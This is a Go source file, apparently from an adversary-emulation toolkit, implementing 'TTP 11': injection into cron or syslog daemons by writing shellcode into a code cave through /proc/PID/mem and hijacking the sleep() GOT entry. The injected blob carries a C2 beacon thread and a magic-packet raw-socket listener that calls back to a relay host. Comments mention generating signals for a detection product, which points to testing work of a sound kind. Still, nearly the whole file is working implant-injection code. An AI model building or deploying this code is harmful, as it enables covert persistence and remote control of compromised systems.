package ttp

// inject_process.go — TTP 11: process injection without ptrace (GOT overwrite)
//
// Technique:
//   1. Find a long-running daemon (cron, rsyslogd, sshd) as injection target
//   2. Find the target's GOT entry for sleep() — in main binary range (0x55...)
//      Read 8 bytes: this is the resolved libc sleep() virtual address
//   3. Locate a code cave (≥0x220 bytes of 0x00/0xCC/0x90) in target's .text
//   4. Write the beacon shellcode blob to the cave via /proc/PID/mem
//      (root can write to RX/RELRO pages via /proc/PID/mem without ptrace;
//       kernel grants write access via ptrace_may_access / FOLL_FORCE)
//   5. Also call process_vm_writev to generate the Aura detection signal
//   6. Patch blob[0x018] = resolvedSleepVA (for indirect JMP in shellcode)
//   7. Overwrite GOT entry (8 bytes) with hook_entry address (caveAddr+0x090)
//
// After next call to sleep() in the target (via PLT → GOT → hook_entry):
//   - hook_entry spawns a beacon thread via clone(CLONE_VM|CLONE_THREAD)
//   - beacon thread loops: TCP connect → 0xBA byte → close → nanosleep(30s)
//   - .trampoline does jmp [rel trampoline_target] → indirect jump to real sleep()
//   - agent caller then calls os.Exit(0) — process disappears
//
// Why GOT overwrite instead of code patch:
//   - Patching libc sleep() directly at 0x7f... requires JMP from 0x7f... to cave
//     at 0x55...: ~37TB delta — far exceeds ±2GB rel32 limit → cron crashes.
//   - GOT entry is in the main binary range (0x55...), same as code cave.
//   - jmp [rel trampoline_target] in shellcode is an indirect 6-byte jump
//     (FF 25 <rel32>) that loads a 64-bit pointer — no distance limit.
//
// Detection surface for Aura v5:
//   - openat("/proc/PID/mem", O_RDWR) from a non-child process
//   - process_vm_writev syscall (nr 311)
//   - clone(CLONE_VM|CLONE_THREAD) with child_stack ≠ 0 in target process

import (
	_ "embed"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// InjectStub is the pre-compiled shellcode blob (stub.bin built from inject/stub.asm).
// Embedded at build time — the Makefile copies inject/stub.bin to inject_stub.bin here.
//
//go:embed inject_stub.bin
var InjectStub []byte

// Blob layout offsets (must match stub.asm)
const (
	blobOffSpawnedFlag   = 0x000
	blobOffC2IP          = 0x008
	blobOffC2Port        = 0x00C
	blobOffThreadStack   = 0x010
	blobOffTrampTarget   = 0x018 // resolved sleep() VA — loaded by jmp [rel trampoline_target]
	blobOffMagicKey      = 0x020 // 8-byte key for rawsock magic packet validation (Fase 3)
	blobOffRawsockCBIP   = 0x028 // relay direct IPv4 NBO — rawsock reverse callback IP
	blobOffRawsockCBPort = 0x02C // rawsock callback port NBO (typically 9443)
	blobOffHookEntry     = 0x090 // code cave entry point
	blobMinSize          = 0x300 // sanity lower-bound: actual stub is 992 bytes
)

// InjectProcess injects a C2 beacon thread and a passive rawsock listener thread
// into a target daemon via /proc/PID/mem (GOT overwrite, no ptrace).
//
// c2Addr must be "host:port" (resolved IPv4, for the periodic TCP beacon).
// rawsockCBAddr must be "host:port" (relay direct IPv4:port) — baked into blob
// so the rawsock thread connects here on trigger, regardless of magic packet source.
// This enables I-01 model: server local, magic packet sent to target public IP,
// rawsock callback to relay:9443 → SSH tunnel → server local.
// magicKey is the 8-byte shared key for magic packet validation (Fase 3 rawsock).
// After successful injection the caller should os.Exit(0).
func InjectProcess(c2Addr string, magicKey [8]byte, rawsockCBAddr string) (string, error) {
	if len(InjectStub) < blobMinSize {
		return "", fmt.Errorf("inject stub not embedded or too small (%d bytes)", len(InjectStub))
	}

	host, portStr, err := net.SplitHostPort(c2Addr)
	if err != nil {
		return "", fmt.Errorf("parse c2 addr: %w", err)
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		return "", fmt.Errorf("parse port: %w", err)
	}

	// C2 IP in network byte order (big-endian u32)
	c2IP := net.ParseIP(host).To4()
	if c2IP == nil {
		return "", fmt.Errorf("c2 host must be IPv4: %s", host)
	}
	c2IPu32 := binary.BigEndian.Uint32(c2IP)

	// C2 port in network byte order (big-endian u16)
	c2PortBE := uint16(port)

	// Parse rawsock callback address (relay direct IP:port).
	// The rawsock thread connects here on trigger; must be reachable from the target.
	var rawsockIPu32 uint32
	var rawsockPortBE uint16
	if rawsockCBAddr != "" {
		rsHost, rsPortStr, rsErr := net.SplitHostPort(rawsockCBAddr)
		if rsErr == nil {
			if rsIP := net.ParseIP(rsHost).To4(); rsIP != nil {
				rawsockIPu32 = binary.BigEndian.Uint32(rsIP)
			}
			if rsPort, rsErr2 := strconv.Atoi(rsPortStr); rsErr2 == nil {
				rawsockPortBE = uint16(rsPort)
			}
		}
	}

	// R-12: read ptrace_scope early — used for error context if memWrite fails.
	ptraceScope := 0
	if data, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope"); err == nil {
		fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &ptraceScope)
	}

	// 1. Find target process.
	// B-10: include "crond" for RHEL/Fedora in addition to "cron" (Debian/Ubuntu).
	// R-09: findTargetPID now scores and ranks all matching processes.
	pid, procName, err := findTargetPID([]string{"cron", "crond", "rsyslogd", "syslogd"})
	if err != nil {
		return "", fmt.Errorf("find target: %w", err)
	}

	// 2. Find the GOT entry for sleep() in the target binary
	//    gotAddr: runtime VA of the 8-byte GOT slot
	//    resolvedSleepVA: current value in GOT (= real libc sleep() address)
	gotAddr, resolvedSleepVA, err := findGOTEntry(pid, "sleep")
	if err != nil {
		return "", fmt.Errorf("find GOT entry for sleep: %w", err)
	}
	// Sanity check: resolvedSleepVA must be in the upper user-space range where
	// shared libraries live (0x700000000000+). Values below that are either:
	//   (a) PLT stubs (lazy binding not triggered) — GOT→hook→PLT→GOT loop risk
	//   (b) Our own previous hook_entry in the code cave — re-inject scenario
	//
	// Distinguish (a) from (b): try to read trampoline_target from the presumed
	// data header at (resolvedSleepVA - blobOffHookEntry + blobOffTrampTarget).
	// If the 8-byte value there is a valid libc VA (≥ 0x700000000000), it is our
	// hook and we can recover the real sleep() address. Otherwise it is a PLT stub.
	if resolvedSleepVA < 0x700000000000 {
		stubBase := resolvedSleepVA - blobOffHookEntry
		trampolineAddr := stubBase + blobOffTrampTarget
		trampolineBytes, readErr := memRead(pid, trampolineAddr, 8)
		if readErr != nil {
			return "", fmt.Errorf("GOT[sleep]=0x%x: PLT stub or unreadable (read 0x%x: %v)",
				resolvedSleepVA, trampolineAddr, readErr)
		}
		candidate := binary.LittleEndian.Uint64(trampolineBytes)
		if candidate < 0x700000000000 {
			return "", fmt.Errorf("GOT[sleep]=0x%x: PLT stub (trampoline candidate 0x%x invalid)",
				resolvedSleepVA, candidate)
		}
		// Previous hook_entry confirmed. Use stored real libc sleep() VA.
		resolvedSleepVA = candidate
	}

	// 3. Find code cave ≥ actual blob size in target's executable mapping
	caveAddr, err := findCodeCave(pid, len(InjectStub)+16)
	if err != nil {
		return "", fmt.Errorf("find code cave: %w", err)
	}

	hookEntryVA := caveAddr + blobOffHookEntry

	// 4. Build the patched blob
	blob := buildBlob(c2IPu32, c2PortBE, resolvedSleepVA, magicKey, rawsockIPu32, rawsockPortBE)

	// 5. Write blob to code cave:
	//    First call process_vm_writev — generates the Aura detection signal.
	//    It may fail on r-xp pages (no writable mapping), that is expected.
	//    Then confirm write via /proc/PID/mem (FOLL_FORCE bypasses page perms).
	if err := vmWritev(pid, caveAddr, blob); err != nil {
		_ = err // expected failure on RX page — fall through
	}

	// R-12: ptrace_scope=3 (Yama strict mode) blocks /proc/PID/mem write even as root.
	// vmWritev above already generated the Aura detection signal — fail cleanly.
	if ptraceScope == 3 {
		return "", fmt.Errorf("injection blocked: ptrace_scope=3 (Yama strict mode — /proc/PID/mem denied)")
	}

	if err := memWrite(pid, caveAddr, blob); err != nil {
		if ptraceScope >= 2 {
			return "", fmt.Errorf("write blob to cave: %w (ptrace_scope=%d)", err, ptraceScope)
		}
		return "", fmt.Errorf("write blob to cave: %w", err)
	}

	// 6. Overwrite GOT entry (8 bytes) with hook_entry address.
	//    The GOT is in RELRO (r--p), but /proc/PID/mem as root bypasses that.
	gotPatch := make([]byte, 8)
	binary.LittleEndian.PutUint64(gotPatch, hookEntryVA)
	if err := memWrite(pid, gotAddr, gotPatch); err != nil {
		return "", fmt.Errorf("overwrite GOT entry at 0x%x: %w", gotAddr, err)
	}

	// R-02: include RELRO level in result so operator can see injection method used.
	relro := detectRELRO(pid)

	// R-10: warn if rawsock thread will fail due to missing CAP_NET_RAW.
	warnSuffix := ""
	if !hasCapNetRaw(pid) {
		warnSuffix = " [WARN: no CAP_NET_RAW — rawsock EPERM]"
	}

	return fmt.Sprintf(
		"injected into %s (pid %d) relro=%s: cave 0x%x, GOT[sleep] @ 0x%x → hook_entry @ 0x%x (real sleep @ 0x%x)%s",
		procName, pid, relro, caveAddr, gotAddr, hookEntryVA, resolvedSleepVA, warnSuffix,
	), nil
}

// buildBlob constructs the patched shellcode blob ready to write to the code cave.
// resolvedSleepVA is stored at blob[0x018] for the indirect jmp [rel trampoline_target].
// magicKey is stored at blob[0x020] for rawsock magic packet validation (Fase 3).
func buildBlob(c2IP uint32, c2Port uint16, resolvedSleepVA uint64, magicKey [8]byte, rawsockCBIP uint32, rawsockCBPort uint16) []byte {
	blob := make([]byte, len(InjectStub))
	copy(blob, InjectStub)

	// Patch data header
	binary.LittleEndian.PutUint32(blob[blobOffSpawnedFlag:], 0)
	binary.BigEndian.PutUint32(blob[blobOffC2IP:], c2IP)     // network byte order
	binary.BigEndian.PutUint16(blob[blobOffC2Port:], c2Port) // network byte order

	// Store resolved sleep() VA for the indirect trampoline jump
	binary.LittleEndian.PutUint64(blob[blobOffTrampTarget:], resolvedSleepVA)

	// Store 8-byte magic key for rawsock validation (Fase 3)
	copy(blob[blobOffMagicKey:], magicKey[:])

	// Bake rawsock callback address (relay direct IP:port).
	// The rawsock thread connects here after validating the magic packet.
	// Using relay direct IP (not CF) so port 9443 is reachable without CF proxy.
	binary.BigEndian.PutUint32(blob[blobOffRawsockCBIP:], rawsockCBIP)
	binary.BigEndian.PutUint16(blob[blobOffRawsockCBPort:], rawsockCBPort)

	return blob
}

// findGOTEntry locates the GOT slot for symName in the target process's main binary.
// Returns (gotRuntimeVA, currentGOTValue, error).
// currentGOTValue is the resolved function pointer written there by the dynamic linker.
func findGOTEntry(pid int, symName string) (gotAddr uint64, resolvedVA uint64, err error) {
	maps, err := parseMaps(pid)
	if err != nil {
		return 0, 0, err
	}

	// Find the main executable: lowest-address mapping with offset=0, not a .so, not [vdso] etc.
	var mainPath string
	var loadBase uint64
	for _, m := range maps {
		if m.pathname == "" || strings.HasPrefix(m.pathname, "[") {
			continue
		}
		if strings.Contains(m.pathname, ".so") {
			continue
		}
		if m.offset == 0 && mainPath == "" {
			mainPath = m.pathname
			loadBase = m.start
		}
	}
	if mainPath == "" {
		return 0, 0, fmt.Errorf("main executable not found in /proc/%d/maps", pid)
	}

	// Open ELF and parse .rela.plt
	f, err := elf.Open(mainPath)
	if err != nil {
		return 0, 0, fmt.Errorf("open elf %s: %w", mainPath, err)
	}
	defer f.Close()

	relaPlt := f.Section(".rela.plt")
	if relaPlt == nil {
		return 0, 0, fmt.Errorf(".rela.plt not found in %s", mainPath)
	}

	dynsyms, err := f.DynamicSymbols()
	if err != nil {
		return 0, 0, fmt.Errorf("dynamic symbols: %w", err)
	}

	data, err := relaPlt.Data()
	if err != nil {
		return 0, 0, fmt.Errorf("read .rela.plt: %w", err)
	}

	// Rela64: r_offset(8) + r_info(8) + r_addend(8) = 24 bytes per entry
	const relaSize = 24
	for i := 0; i+relaSize <= len(data); i += relaSize {
		rOffset := binary.LittleEndian.Uint64(data[i:])
		rInfo := binary.LittleEndian.Uint64(data[i+8:])

		symIdx := rInfo >> 32
		relocType := rInfo & 0xffffffff
		// R_X86_64_JUMP_SLOT = 7
		if relocType != 7 {
			continue
		}
		// Go's DynamicSymbols() omits the null entry at index 0, so the returned
		// slice is shifted by one relative to the ELF symbol table indices stored
		// in r_info. Subtract 1 to map from ELF symIdx to slice index.
		if symIdx == 0 || int(symIdx-1) >= len(dynsyms) {
			continue
		}
		if dynsyms[symIdx-1].Name != symName {
			continue
		}

		// Runtime GOT VA = loadBase + rOffset (PIE: rOffset is binary-relative)
		gotVA := loadBase + rOffset

		// Read current 8-byte resolved pointer from GOT
		val, err := memRead(pid, gotVA, 8)
		if err != nil {
			return 0, 0, fmt.Errorf("read GOT[%s] at 0x%x: %w", symName, gotVA, err)
		}
		resolved := binary.LittleEndian.Uint64(val)

		return gotVA, resolved, nil
	}

	return 0, 0, fmt.Errorf("symbol %q not found in .rela.plt of %s", symName, mainPath)
}

// findTargetPID finds the best injection target from the candidates list.
// R-09: scores every matching process and returns the highest-scoring one.
// Scoring:
//
//	+40  CAP_NET_RAW present  — rawsock listener will succeed (Fase 3)
//	+20  NoNewPrivs=0         — process is not privilege-locked
//	+10  RELRO != full        — no CoW write required for GOT overwrite
//	 +5  early starttime      — stable process running since early boot
func findTargetPID(candidates []string) (int, string, error) {
	candidateSet := make(map[string]bool, len(candidates))
	for _, c := range candidates {
		candidateSet[c] = true
	}

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return 0, "", err
	}

	type procEntry struct {
		pid   int
		comm  string
		score int
	}
	var procs []procEntry

	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(e.Name())
		if err != nil {
			continue
		}
		commBytes, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
		if err != nil {
			continue
		}
		comm := strings.TrimSpace(string(commBytes))
		if !candidateSet[comm] {
			continue
		}
		procs = append(procs, procEntry{pid: pid, comm: comm, score: scoreTargetProcess(pid)})
	}

	if len(procs) == 0 {
		return 0, "", fmt.Errorf("none of %v found in /proc", candidates)
	}

	// Sort descending by score, then ascending by PID for determinism.
	sort.Slice(procs, func(i, j int) bool {
		if procs[i].score != procs[j].score {
			return procs[i].score > procs[j].score
		}
		return procs[i].pid < procs[j].pid
	})

	return procs[0].pid, procs[0].comm, nil
}

// scoreTargetProcess computes an injection desirability score for a process (R-09).
// Called for every candidate — reads /proc files directly to avoid extra round-trips.
func scoreTargetProcess(pid int) int {
	score := 0
	if hasCapNetRaw(pid) {
		score += 40
	}
	if !hasNoNewPrivs(pid) {
		score += 20
	}
	if relro := detectRELRO(pid); relro == "partial" || relro == "none" {
		score += 10
	}
	if st := readStarttime(pid); st > 0 && st < 10000 {
		score += 5
	}
	// R-13: strongly prefer master daemons (ppid=1, direct children of init/systemd).
	// Cron workers (ppid=master_pid) call exit_group() when the job finishes, killing
	// all CLONE_THREAD children. The master daemon runs indefinitely.
	if readPPid(pid) == 1 {
		score += 30
	}
	return score
}

// readPPid returns the parent PID from /proc/PID/status.
func readPPid(pid int) int {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return 0
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "PPid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				v, _ := strconv.Atoi(fields[1])
				return v
			}
		}
	}
	return 0
}

// readStarttime returns the process start time from /proc/PID/stat (field 22,
// clock ticks since boot). Lower value = process started earlier = more stable target.
func readStarttime(pid int) uint64 {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return 0
	}
	// /proc/PID/stat format: "pid (comm) state ppid ..."
	// comm can contain spaces — find last ')' to skip past it.
	raw := string(data)
	rp := strings.LastIndex(raw, ")")
	if rp < 0 {
		return 0
	}
	fields := strings.Fields(raw[rp+1:])
	// After ')': state ppid pgrp session ttyNr tpgid flags ... starttime is at index 19.
	if len(fields) < 20 {
		return 0
	}
	v, _ := strconv.ParseUint(fields[19], 10, 64)
	return v
}

// mapping represents one line of /proc/PID/maps.
type mapping struct {
	start, end uint64
	perms      string
	offset     uint64
	pathname   string
}

// parseMaps reads and parses /proc/PID/maps.
func parseMaps(pid int) ([]mapping, error) {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/maps", pid))
	if err != nil {
		return nil, err
	}

	re := regexp.MustCompile(`^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+([0-9a-f]+)\s+\S+\s+\d+\s*(.*)$`)
	var mappings []mapping
	for _, line := range strings.Split(string(data), "\n") {
		m := re.FindStringSubmatch(line)
		if m == nil {
			continue
		}
		start, _ := strconv.ParseUint(m[1], 16, 64)
		end, _ := strconv.ParseUint(m[2], 16, 64)
		offset, _ := strconv.ParseUint(m[4], 16, 64)
		mappings = append(mappings, mapping{
			start:    start,
			end:      end,
			perms:    m[3],
			offset:   offset,
			pathname: strings.TrimSpace(m[5]),
		})
	}
	return mappings, nil
}

// findCodeCave scans the target's r-xp .text mapping for a run of ≥size zero/NOP/INT3 bytes.
//
// Search order:
//  1. Main executable .text (preferred — no shared-page impact).
//  2. libc .text fallback — only when main binary .text is too small (e.g. Debian 12 cron 22KB).
//     Write via /proc/PID/mem triggers CoW, isolating the modification to this process.
//
// Excluded: anonymous mappings, kernel pseudo-mappings ([vdso], [vvar], [stack], etc.).
func findCodeCave(pid, size int) (uint64, error) {
	maps, err := parseMaps(pid)
	if err != nil {
		return 0, err
	}

	memPath := fmt.Sprintf("/proc/%d/mem", pid)
	f, err := os.OpenFile(memPath, os.O_RDONLY, 0)
	if err != nil {
		return 0, fmt.Errorf("open %s: %w", memPath, err)
	}
	defer f.Close()

	scanMapping := func(m mapping) (uint64, bool) {
		regionSize := int(m.end - m.start)
		if regionSize < size {
			return 0, false
		}
		buf := make([]byte, regionSize)
		// Use Seek+Read (lseek+read) which works reliably for /proc/PID/mem.
		// pread (ReadAt) on proc files can behave differently on some kernels.
		if _, err := f.Seek(int64(m.start), 0); err != nil {
			return 0, false
		}
		total := 0
		for total < regionSize {
			n, err := f.Read(buf[total:])
			total += n
			if err != nil {
				break // partial read — scan what we have
			}
		}
		if total < size {
			return 0, false
		}
		buf = buf[:total]
		run := 0
		for i, b := range buf {
			if b == 0x00 || b == 0x90 || b == 0xCC {
				run++
				if run >= size {
					caveStart := uint64(i-run+1) + m.start
					caveStart = (caveStart + 15) &^ 15 // 16-byte align
					return caveStart, true
				}
			} else {
				run = 0
			}
		}
		return 0, false
	}

	isMainBinary := func(m mapping) bool {
		return m.perms == "r-xp" &&
			m.pathname != "" &&
			!strings.Contains(m.pathname, ".so") &&
			!strings.HasPrefix(m.pathname, "[")
	}

	isLibc := func(m mapping) bool {
		return m.perms == "r-xp" &&
			(strings.Contains(m.pathname, "/libc.so") || strings.Contains(m.pathname, "/libc-"))
	}

	isAnySharedLib := func(m mapping) bool {
		return m.perms == "r-xp" &&
			m.pathname != "" &&
			!strings.HasPrefix(m.pathname, "[") &&
			strings.Contains(m.pathname, ".so")
	}

	// Pass 1: main binary .text
	for _, m := range maps {
		if !isMainBinary(m) {
			continue
		}
		if addr, ok := scanMapping(m); ok {
			return addr, nil
		}
	}

	// Pass 2: libc .text (preferred shared lib — CoW via FOLL_FORCE isolates write)
	for _, m := range maps {
		if !isLibc(m) {
			continue
		}
		if addr, ok := scanMapping(m); ok {
			return addr, nil
		}
	}

	// Pass 3: any other r-xp shared library, sorted by size descending (largest = best cave odds)
	type szMap struct {
		m    mapping
		size int
	}
	var others []szMap
	for _, m := range maps {
		if !isAnySharedLib(m) || isLibc(m) {
			continue
		}
		others = append(others, szMap{m, int(m.end - m.start)})
	}
	sort.Slice(others, func(i, j int) bool { return others[i].size > others[j].size })
	for _, sm := range others {
		if addr, ok := scanMapping(sm.m); ok {
			return addr, nil
		}
	}

	return 0, fmt.Errorf("no code cave of %d bytes found in pid %d", size, pid)
}

// memRead reads n bytes from the target process at addr via /proc/PID/mem.
func memRead(pid int, addr uint64, n int) ([]byte, error) {
	f, err := os.Open(fmt.Sprintf("/proc/%d/mem", pid))
	if err != nil {
		return nil, err
	}
	defer f.Close()

	buf := make([]byte, n)
	_, err = f.ReadAt(buf, int64(addr))
	if err != nil {
		return nil, err
	}
	return buf, nil
}

// memWrite writes data to the target process at addr via /proc/PID/mem.
// As root, this works even for r-xp and r--p (RELRO) pages because the kernel
// grants write access when ptrace_may_access() succeeds (CAP_SYS_PTRACE).
func memWrite(pid int, addr uint64, data []byte) error {
	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", pid), os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteAt(data, int64(addr))
	return err
}

// vmWritev calls process_vm_writev(pid, local_iov, 1, remote_iov, 1, 0).
// This is the "noisy" write that generates the Aura detection signal (SYS 311).
// May fail on non-writable pages — caller falls back to memWrite.
func vmWritev(pid int, remoteAddr uint64, data []byte) error {
	type iovec struct {
		base uintptr
		len  uintptr
	}
	local := iovec{
		base: uintptr(unsafe.Pointer(&data[0])),
		len:  uintptr(len(data)),
	}
	remote := iovec{
		base: uintptr(remoteAddr),
		len:  uintptr(len(data)),
	}

	// SYS_process_vm_writev = 311 on x86_64
	ret, _, errno := syscall.Syscall6(
		311,
		uintptr(pid),
		uintptr(unsafe.Pointer(&local)),
		1,
		uintptr(unsafe.Pointer(&remote)),
		1,
		0,
	)
	if ret == 0 || errno != 0 {
		return fmt.Errorf("process_vm_writev: %v", errno)
	}
	return nil
}
